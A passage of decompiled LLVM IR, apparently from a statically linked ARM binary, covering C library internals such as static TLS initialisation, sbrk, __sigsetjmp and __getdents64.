  %v0_17354 = phi i32 [ %v2_1732c, %bb ], [ 0, %dec_label_pc_17350 ]
  %storemerge = phi i32 [ %v3_172e4, %bb ], [ 1, %dec_label_pc_17350 ]
  %storemerge79 = phi i32 [ %v3_172e4, %bb ], [ 1, %dec_label_pc_17350 ]
  %v0_17364 = phi i32 [ ptrtoint (i32* @global_var_21698.346 to i32), %bb ], [ %v0_17364.pre, %dec_label_pc_17350 ]
  %v1_17354 = phi i32 [ %v0_172b8, %bb ], [ %v1_17354.pre, %dec_label_pc_17350 ]
  %v1_17378 = phi i32 [ %v0_172bc.v3_172e4, %bb ], [ %v1_1737825, %dec_label_pc_17350 ]
  %stack_var_-52.3 = phi i32 [ %v3_172e0, %bb ], [ %stack_var_-52.0, %dec_label_pc_17350 ]
  %stack_var_-48.3 = phi i32 [ %v3_172ec, %bb ], [ %stack_var_-48.0, %dec_label_pc_17350 ]
  %stack_var_-44.3 = phi i32 [ %v3_172f0, %bb ], [ %stack_var_-44.0, %dec_label_pc_17350 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17354 = add i32 %v1_17354, %v0_17354
  %v2_17358 = udiv i32 %v2_17354, %storemerge
  store i32 %v2_17358, i32* %r0.global-to-local, align 4
  %v2_1735c = mul i32 %v2_17358, %storemerge
  store i32 %v2_1735c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17364 = add i32 %v0_17364, 72
  %v3_17364 = inttoptr i32 %v2_17364 to i32*
  %v4_17364 = load i32, i32* %v3_17364, align 4
  store i32 %v4_17364, i32* %r3.global-to-local, align 4
  %v1_17368 = inttoptr i32 %v4_17364 to i32*
  %v2_17368 = load i32, i32* %v1_17368, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17370 = add i32 %v1_17378, 1168
  %v2_17374 = add i32 %v1_17370, %stack_var_-52.3
  %v2_17378 = add i32 %v2_17374, %v2_1735c
  %v2_1737c = add i32 %v2_17378, %v2_17368
  store i32 %v2_1737c, i32* %r0.global-to-local, align 4
  %v1_17380 = call i32 @__GI_sbrk(i32 %v2_1737c)
  %v1_17384 = load i32, i32* %fp.global-to-local, align 4
  %v1_1738c = sub i32 0, %v1_17384
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17384 = add i32 %v1_17380, 1167
  %v1_17394 = add i32 %v2_17384, %v1_17384
  %v2_17398 = and i32 %v1_17394, %v1_1738c
  store i32 %v2_17398, i32* @r5, align 4
  %v1_173a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_173a0 = add i32 %v1_173a0, 10236
  %v4_173a0 = inttoptr i32 %v3_173a0 to i32*
  store i32 62, i32* %v4_173a0, align 4
  %v0_173a8 = load i32, i32* @r5, align 4
  %v1_173a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_173a8 = add i32 %v1_173a8, %v0_173a8
  store i32 %v2_173a8, i32* @ip, align 4
  %v0_173ac = load i32, i32* %sl.global-to-local, align 4
  %v1_173ac = load i32, i32* %r4.global-to-local, align 4
  %v2_173ac = add i32 %v1_173ac, %v0_173ac
  store i32 %v2_173ac, i32* %r4.global-to-local, align 4
  %v2_173b0 = add i32 %v0_173ac, 11524
  store i32 %v2_173b0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_173a8, i32* @r0, align 4
  %v2_173c4 = add i32 %v2_173ac, 16
  %v3_173c4 = inttoptr i32 %v2_173c4 to i32*
  store i32 %v2_173a8, i32* %v3_173c4, align 4
  %v0_173c8 = load i32, i32* %sb.global-to-local, align 4
  %v1_173c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_173c8 = add i32 %v1_173c8, 40
  %v3_173c8 = inttoptr i32 %v2_173c8 to i32*
  store i32 %v0_173c8, i32* %v3_173c8, align 4
  %v0_173cc = load i32, i32* @r3, align 4
  %v1_173cc = trunc i32 %v0_173cc to i8
  %v2_173cc = load i32, i32* %r4.global-to-local, align 4
  %v3_173cc = add i32 %v2_173cc, 20
  %v4_173cc = inttoptr i32 %v3_173cc to i8*
  store i8 %v1_173cc, i8* %v4_173cc, align 1
  %v0_173d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_173d0 = add i32 %v0_173d0, 8
  store i32 %v1_173d0, i32* @r4, align 4
  %v0_173d4 = call i32 @memcpy()
  %v0_173dc = load i32, i32* @r4, align 4
  %v1_173dc = load i32, i32* @r5, align 4
  %v2_173dc = inttoptr i32 %v1_173dc to i32*
  store i32 %v0_173dc, i32* %v2_173dc, align 4
  %v0_173e0 = load i32, i32* @r5, align 4
  store i32 %v0_173e0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_173e0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_12cd0.539 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_173f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_173f4 = add i32 %v0_173f4, 84
  %v3_173f4 = inttoptr i32 %v2_173f4 to i32*
  %v4_173f4 = load i32, i32* %v3_173f4, align 4
  store i32 %v4_173f4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17400 = add i32 %v0_173f4, 60
  %v3_17400 = inttoptr i32 %v2_17400 to i32*
  %v4_17400 = load i32, i32* %v3_17400, align 4
  store i32 %v4_17400, i32* %r0.global-to-local, align 4
  %v3_17408 = add i32 %v0_173f4, 10748
  %v4_17408 = inttoptr i32 %v3_17408 to i32*
  store i32 64, i32* %v4_17408, align 4
  %v1_17410 = load i32, i32* %r8.global-to-local, align 4
  %v2_17410 = add i32 %v1_17410, 20
  %v3_17410 = inttoptr i32 %v2_17410 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17410, align 4
  %v1_17418 = load i32, i32* %r8.global-to-local, align 4
  %v2_17418 = add i32 %v1_17418, 24
  %v3_17418 = inttoptr i32 %v2_17418 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17418, align 4
  %v1_17420 = load i32, i32* %r0.global-to-local, align 4
  %v2_17420 = inttoptr i32 %v1_17420 to i32*
  store i32 1, i32* %v2_17420, align 4
  %v1_17428 = load i32, i32* %r8.global-to-local, align 4
  %v2_17428 = add i32 %v1_17428, 28
  %v3_17428 = inttoptr i32 %v2_17428 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17428, align 4
  %v0_17430 = load i32, i32* @r6, align 4
  %v2_17430 = icmp eq i32 %v0_17430, 0
  %v1_17434 = load i32, i32* %r8.global-to-local, align 4
  %v2_17434 = add i32 %v1_17434, 44
  %v3_17434 = inttoptr i32 %v2_17434 to i32*
  store i32 1, i32* %v3_17434, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1743c = load i32, i32* %sl.global-to-local, align 4
  %v1_1743c = load i32, i32* %r1.global-to-local, align 4
  %v2_1743c = add i32 %v1_1743c, %v0_1743c
  store i32 %v2_1743c, i32* %r2.global-to-local, align 4
  %v1_17440 = load i32, i32* @r6, align 4
  br i1 %v2_17430, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17354
  store i32 %v1_17440, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1744c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1744c35 = add i32 %v1_1744c34, 32
  %v3_1744c36 = inttoptr i32 %v2_1744c35 to i32*
  store i32 %v1_17440, i32* %v3_1744c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17354
  %v2_17444 = add i32 %v1_17440, -1
  store i32 %v2_17444, i32* %r0.global-to-local, align 4
  %v1_1744c = load i32, i32* %r8.global-to-local, align 4
  %v2_1744c = add i32 %v1_1744c, 32
  %v3_1744c = inttoptr i32 %v2_1744c to i32*
  store i32 %v1_17440, i32* %v3_1744c, align 4
  %v1_17450 = load i32, i32* @r6, align 4
  store i32 %v1_17450, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17454 = load i32, i32* %r8.global-to-local, align 4
  %v1_17454 = load i32, i32* %r2.global-to-local, align 4
  %v2_17454 = add i32 %v1_17454, 28
  %v3_17454 = inttoptr i32 %v2_17454 to i32*
  store i32 %v0_17454, i32* %v3_17454, align 4
  %v0_17458 = load i32, i32* %r2.global-to-local, align 4
  %v1_17458 = load i32, i32* %ip.global-to-local, align 4
  %v2_17458 = inttoptr i32 %v1_17458 to i32*
  store i32 %v0_17458, i32* %v2_17458, align 4
  %v0_1745c = load i32, i32* %r0.global-to-local, align 4
  %v1_1745c = load i32, i32* %r3.global-to-local, align 4
  %v2_1745c = add i32 %v1_1745c, %v0_1745c
  store i32 %v2_1745c, i32* %r0.global-to-local, align 4
  %v1_17460 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17430, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17468.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17468 = phi i32 [ %v0_17468.pre, %._crit_edge ], [ %v1_17460, %bb54 ]
  %v2_17464 = udiv i32 %v2_1745c, %v1_17460
  %v2_17468 = load i32, i32* %sb.global-to-local, align 4
  %v3_17468 = mul i32 %v2_17464, %v0_17468
  %v4_17468 = add i32 %v2_17468, %v3_17468
  store i32 %v4_17468, i32* @r0, align 4
  %v0_1746c = load i32, i32* %fp.global-to-local, align 4
  %v2_1746c = icmp ult i32 %v0_1746c, 16
  %v0_1746c. = select i1 %v2_1746c, i32 16, i32 %v0_1746c
  store i32 %v0_1746c., i32* @r1, align 4
  %v2_1747c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1747c, i32* @r4, align 4
  store i32 %v6_17298, i32* @r5, align 4
  store i32 %v15_17298, i32* %r8.global-to-local, align 4
  store i32 %v18_17298, i32* %sb.global-to-local, align 4
  store i32 %v21_17298, i32* %sl.global-to-local, align 4
  store i32 %v24_17298, i32* %fp.global-to-local, align 4
  store i32 %v27_17298, i32* @lr, align 4
  %v0_17480 = call i32 @init_static_tls()
  store i32 %v0_17480, i32* %r0.global-to-local, align 4
  %v0_1748c.pre = load i32, i32* @ip, align 4
  %v1_17354.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17364.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17484

dec_label_pc_17310.dec_label_pc_17484.loopexit_crit_edge: ; preds = %dec_label_pc_1730c
  br label %dec_label_pc_17484.loopexit

dec_label_pc_17484.loopexit:                      ; preds = %dec_label_pc_17310.dec_label_pc_17484.loopexit_crit_edge, %dec_label_pc_172c4
  br label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_17484.loopexit, %entry, %bb55
  %v0_17364.pre.pre = phi i32 [ ptrtoint (i32* @global_var_21698.346 to i32), %dec_label_pc_17484.loopexit ], [ ptrtoint (i32* @global_var_21698.346 to i32), %entry ], [ %v0_17364.pre.pre.pre, %bb55 ]
  %v1_17354.pre.pre = phi i32 [ %v0_172b8, %dec_label_pc_17484.loopexit ], [ %v0_172b8, %entry ], [ %v1_17354.pre.pre.pre, %bb55 ]
  %v0_1748c = phi i32 [ %v0_172bc, %dec_label_pc_17484.loopexit ], [ %v0_172bc, %entry ], [ %v0_1748c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1748c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17350

; uselistorder directives
  uselistorder i32 %v0_1748c, { 1, 0 }
  uselistorder i32 %v1_17440, { 1, 0, 2, 3 }
  uselistorder i32 %v0_173ac, { 1, 0 }
  uselistorder i32 %v2_173a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1730c, { 2, 1, 0 }
  uselistorder i32 %v3_172e4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_172ec66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17310, { 1, 0 }
  uselistorder i32 %v0_172bc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_172b8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_172ac, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17484, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17354, { 1, 0 }
  uselistorder label %dec_label_pc_17350, { 1, 0 }
  uselistorder label %dec_label_pc_172d4, { 1, 0 }
}

define i32 @function_174a4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_174a4:
  %v0_174a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_174a4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_174a4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_174a4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_174d0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_174d0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v4_174e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 156) to i32*), align 4
  %v4_174e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 104) to i32*), align 4
  store i32 %v4_174e8, i32* %r1.global-to-local, align 4
  %v1_174ec = add i32 %arg1, 44
  %v2_174ec = inttoptr i32 %v1_174ec to i32*
  %v3_174ec = load i32, i32* %v2_174ec, align 4
  %v1_174f0 = add i32 %arg1, 28
  %v2_174f0 = inttoptr i32 %v1_174f0 to i32*
  %v3_174f0 = load i32, i32* %v2_174f0, align 4
  store i32 %v3_174f0, i32* %r2.global-to-local, align 4
  %v2_174f4 = inttoptr i32 %v4_174e0 to i32*
  store i32 %v3_174ec, i32* %v2_174f4, align 4
  %v0_174f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_174f8 = inttoptr i32 %v1_174f8 to i32*
  store i32 %v0_174f8, i32* %v2_174f8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17504(i32 %arg1) local_unnamed_addr {
dec_label_pc_17504:
  %v0_17504 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17504, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17504
  %v1_17504 = load i32, i32* @ip, align 4
  %v3_17504 = mul i32 %v1_17504, %arg1
  %v2_17508 = load i32, i32* @r8, align 4
  %v4_17508 = and i32 %v2_17508, %v3_17504
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17504, %bb
  %v5_17508 = phi i32 [ %arg1, %dec_label_pc_17504 ], [ %v4_17508, %bb ]
  ret i32 %v5_17508

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17514 = add i32 %arg1, 40
  store i32 %v1_17514, i32* %r2.global-to-local, align 4
  %v1_17518 = inttoptr i32 %v1_17514 to i32*
  %v2_17518 = load i32, i32* %v1_17518, align 4
  store i32 %v2_17518, i32* %r2.global-to-local, align 4
  %v3_17518 = add i32 %arg1, 44
  %v4_17518 = inttoptr i32 %v3_17518 to i32*
  %v5_17518 = load i32, i32* %v4_17518, align 4
  store i32 %v5_17518, i32* %r3.global-to-local, align 4
  %v0_1751c = call i32 @__aeabi_read_tp()
  %v1_17520 = inttoptr i32 %v0_1751c to i32*
  %v2_17520 = load i32, i32* %v1_17520, align 4
  store i32 %v2_17520, i32* %r1.global-to-local, align 4
  %v3_17524 = mul i32 %v5_17518, 8
  store i32 %v3_17524, i32* %r3.global-to-local, align 4
  %v1_17528 = load i32, i32* %r2.global-to-local, align 4
  %v2_17528 = add i32 %v1_17528, %v0_1751c
  %v3_1752c = add i32 %v3_17524, %v2_17520
  %v4_1752c = inttoptr i32 %v3_1752c to i32*
  store i32 %v2_17528, i32* %v4_1752c, align 4
  %v0_17530 = load i32, i32* %r3.global-to-local, align 4
  %v1_17530 = load i32, i32* %r1.global-to-local, align 4
  %v2_17530 = add i32 %v1_17530, %v0_17530
  store i32 %v2_17530, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17538 = add i32 %v2_17530, 4
  %v5_17538 = inttoptr i32 %v4_17538 to i8*
  store i8 1, i8* %v5_17538, align 1
  %v0_1753c = load i32, i32* @r4, align 4
  %v1_1753c = add i32 %v0_1753c, 20
  store i32 %v1_1753c, i32* %r1.global-to-local, align 4
  %v1_17540 = inttoptr i32 %v1_1753c to i32*
  %v2_17540 = load i32, i32* %v1_17540, align 4
  store i32 %v2_17540, i32* @r1, align 4
  %v3_17540 = add i32 %v0_1753c, 24
  %v4_17540 = inttoptr i32 %v3_17540 to i32*
  %v5_17540 = load i32, i32* %v4_17540, align 4
  store i32 %v5_17540, i32* %r2.global-to-local, align 4
  %v5_17544 = call i32 @__GI_mempcpy(i32 %v2_17528, i32 %v2_17540, i32 %v5_17540, i32 1)
  %v0_17548 = load i32, i32* @r4, align 4
  %v1_17548 = add i32 %v0_17548, 28
  store i32 %v1_17548, i32* %r3.global-to-local, align 4
  %v1_1754c = inttoptr i32 %v1_17548 to i32*
  %v2_1754c = load i32, i32* %v1_1754c, align 4
  store i32 %v2_1754c, i32* %r2.global-to-local, align 4
  %v3_1754c = add i32 %v0_17548, 24
  %v4_1754c = inttoptr i32 %v3_1754c to i32*
  %v5_1754c = load i32, i32* %v4_1754c, align 4
  store i32 %v5_1754c, i32* %r3.global-to-local, align 4
  %v2_17550 = sub i32 %v5_1754c, %v2_1754c
  store i32 %v2_17550, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17558 = inttoptr i32 %v5_17544 to i8*
  %v4_17558 = call i32 @__GI_memset(i8* %v3_17558, i32 0, i32 %v2_17550)
  ret i32 %v4_17558

; uselistorder directives
  uselistorder i32 %v3_17524, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_175a8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_175bc = load i32, i32* @r0, align 4
  %v1_175c0 = inttoptr i32 %v0_175bc to i32*
  %v2_175c0 = load i32, i32* @r4, align 4
  store i32 %v2_175c0, i32* %v1_175c0, align 4
  %v3_175c0 = add i32 %v0_175bc, 4
  %v4_175c0 = inttoptr i32 %v3_175c0 to i32*
  %v5_175c0 = load i32, i32* @r5, align 4
  store i32 %v5_175c0, i32* %v4_175c0, align 4
  %v6_175c0 = add i32 %v0_175bc, 8
  %v7_175c0 = inttoptr i32 %v6_175c0 to i32*
  %v8_175c0 = load i32, i32* @r6, align 4
  store i32 %v8_175c0, i32* %v7_175c0, align 4
  %v9_175c0 = add i32 %v0_175bc, 12
  %v10_175c0 = inttoptr i32 %v9_175c0 to i32*
  %v11_175c0 = load i32, i32* @r7, align 4
  store i32 %v11_175c0, i32* %v10_175c0, align 4
  %v12_175c0 = add i32 %v0_175bc, 16
  %v13_175c0 = inttoptr i32 %v12_175c0 to i32*
  %v14_175c0 = load i32, i32* @r8, align 4
  store i32 %v14_175c0, i32* %v13_175c0, align 4
  %v15_175c0 = add i32 %v0_175bc, 20
  %v16_175c0 = inttoptr i32 %v15_175c0 to i32*
  %v17_175c0 = load i32, i32* @sb, align 4
  store i32 %v17_175c0, i32* %v16_175c0, align 4
  %v18_175c0 = add i32 %v0_175bc, 24
  %v19_175c0 = inttoptr i32 %v18_175c0 to i32*
  %v20_175c0 = load i32, i32* @sl, align 4
  store i32 %v20_175c0, i32* %v19_175c0, align 4
  %v21_175c0 = add i32 %v0_175bc, 28
  %v22_175c0 = inttoptr i32 %v21_175c0 to i32*
  %v23_175c0 = load i32, i32* @fp, align 4
  store i32 %v23_175c0, i32* %v22_175c0, align 4
  %v24_175c0 = add i32 %v0_175bc, 32
  %v25_175c0 = inttoptr i32 %v24_175c0 to i32*
  %v27_175c0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_175c0, i32* %v25_175c0, align 4
  %v28_175c0 = add i32 %v0_175bc, 36
  %v29_175c0 = inttoptr i32 %v28_175c0 to i32*
  %v30_175c0 = load i32, i32* @lr, align 4
  store i32 %v30_175c0, i32* %v29_175c0, align 4
  %v0_175c4 = call i32 @__sigjmp_save()
  ret i32 %v0_175c4

; uselistorder directives
  uselistorder i32 %v0_175bc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 90, 91, 5, 6, 7, 8, 9, 10, 11, 12, 78, 79, 80, 81, 82, 84, 83, 85, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 2, 3, 4, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 69, 70, 72, 73, 76, 74, 75, 77, 86, 87, 88, 89, 92 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_175cc = load i32, i32* @r5, align 4
  %v12_175cc = load i32, i32* @r7, align 4
  %v1_175d0 = add i32 %arg3, 14
  %v2_175d8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_175dc = and i32 %v1_175d0, -8
  %v2_175e0 = sub i32 %v2_175d8, %v1_175dc
  %v1_175e4 = add i32 %v2_175e0, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17628, label %dec_label_pc_1760c

dec_label_pc_1760c:                               ; preds = %entry
  %v1_17610 = sub i32 0, %arg1
  %v3_17614 = load i16, i16* @global_var_216f0.341, align 2
  %v4_17614 = sext i16 %v3_17614 to i32
  %v0_17618 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17620 = add i32 %v4_17614, %v0_17618
  %v4_17620 = inttoptr i32 %v3_17620 to i32*
  store i32 %v1_17610, i32* %v4_17620, align 4
  br label %dec_label_pc_176f8

dec_label_pc_17628:                               ; preds = %entry
  br i1 false, label %dec_label_pc_176f8, label %dec_label_pc_17630

dec_label_pc_17630:                               ; preds = %dec_label_pc_17628
  %v2_17630 = add i32 %v1_175e4, %arg1
  store i32 %v2_17630, i32* %r1.global-to-local, align 4
  %v2_17634 = add i32 %tmp, %arg3
  store i32 %v1_175e4, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_176e0

dec_label_pc_17650:                               ; preds = %dec_label_pc_176e0
  %v1_17650 = add i32 %v0_176b0, 16
  %v2_17650 = inttoptr i32 %v1_17650 to i16*
  %v3_17650 = load i16, i16* %v2_17650, align 2
  %v4_17650 = zext i16 %v3_17650 to i32
  %v1_17654 = add nsw i32 %v4_17650, -19
  store i32 %v1_17654, i32* @r2, align 4
  %v1_17658 = add nuw nsw i32 %v4_17650, 7
  %v1_1765c = and i32 %v1_17658, 131064
  store i32 %v1_1765c, i32* @ip, align 4
  %v2_17664 = add i32 %v1_1765c, %v0_176b8
  store i32 %v2_17664, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17664, %v2_17634
  br i1 %tmp24, label %dec_label_pc_17670, label %dec_label_pc_176ac

dec_label_pc_17670:                               ; preds = %dec_label_pc_17650
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17678 = load i32, i32* %r8.global-to-local, align 4
  %v0_1767c = load i32, i32* %sb.global-to-local, align 4
  %v1_17680 = load i32, i32* @sp, align 4
  %v2_17680 = inttoptr i32 %v1_17680 to i32*
  store i32 0, i32* %v2_17680, align 4
  %v4_17684 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17678, i32 %v0_1767c)
  %v0_17688 = load i32, i32* @r5, align 4
  %v1_17688 = load i32, i32* %sl.global-to-local, align 4
  %v9_17688 = icmp eq i32 %v0_17688, %v1_17688
  br i1 %v9_17688, label %dec_label_pc_17690, label %dec_label_pc_176f4

dec_label_pc_17690:                               ; preds = %dec_label_pc_17670
  %v0_17694 = call i32 @__aeabi_read_tp()
  %v3_17698 = load i16, i16* @global_var_216f0.341, align 2
  %v4_17698 = sext i16 %v3_17698 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_176a4 = add i32 %v4_17698, %v0_17694
  %v4_176a4 = inttoptr i32 %v3_176a4 to i32*
  store i32 22, i32* %v4_176a4, align 4
  br label %dec_label_pc_176f8

dec_label_pc_176ac:                               ; preds = %dec_label_pc_17650
  %v1_176ac = inttoptr i32 %v0_176b0 to i32*
  %v2_176ac = load i32, i32* %v1_176ac, align 4
  %v3_176ac = add i32 %v0_176b0, 4
  %v4_176ac = inttoptr i32 %v3_176ac to i32*
  %v5_176ac = load i32, i32* %v4_176ac, align 4
  store i32 %v5_176ac, i32* @r4, align 4
  %v1_176b0 = add i32 %v0_176b0, 8
  store i32 %v1_176b0, i32* %r8.global-to-local, align 4
  %v1_176b4 = inttoptr i32 %v1_176b0 to i32*
  %v2_176b4 = load i32, i32* %v1_176b4, align 4
  store i32 %v2_176b4, i32* %r8.global-to-local, align 4
  %v3_176b4 = add i32 %v0_176b0, 12
  %v4_176b4 = inttoptr i32 %v3_176b4 to i32*
  %v5_176b4 = load i32, i32* %v4_176b4, align 4
  store i32 %v5_176b4, i32* %sb.global-to-local, align 4
  %v1_176b8 = inttoptr i32 %v0_176b8 to i32*
  store i32 %v2_176ac, i32* %v1_176b8, align 4
  %v3_176b8 = add i32 %v0_176b8, 4
  %v4_176b8 = inttoptr i32 %v3_176b8 to i32*
  %v5_176b8 = load i32, i32* @r4, align 4
  store i32 %v5_176b8, i32* %v4_176b8, align 4
  %v0_176bc = load i32, i32* %r8.global-to-local, align 4
  %v1_176bc = load i32, i32* @r5, align 4
  %v2_176bc = add i32 %v1_176bc, 8
  %v3_176bc = inttoptr i32 %v2_176bc to i32*
  store i32 %v0_176bc, i32* %v3_176bc, align 4
  %v0_176c0 = load i32, i32* %sb.global-to-local, align 4
  %v1_176c0 = load i32, i32* @r5, align 4
  %v2_176c0 = add i32 %v1_176c0, 12
  %v3_176c0 = inttoptr i32 %v2_176c0 to i32*
  store i32 %v0_176c0, i32* %v3_176c0, align 4
  %v0_176c4 = load i32, i32* @ip, align 4
  %v1_176c4 = trunc i32 %v0_176c4 to i16
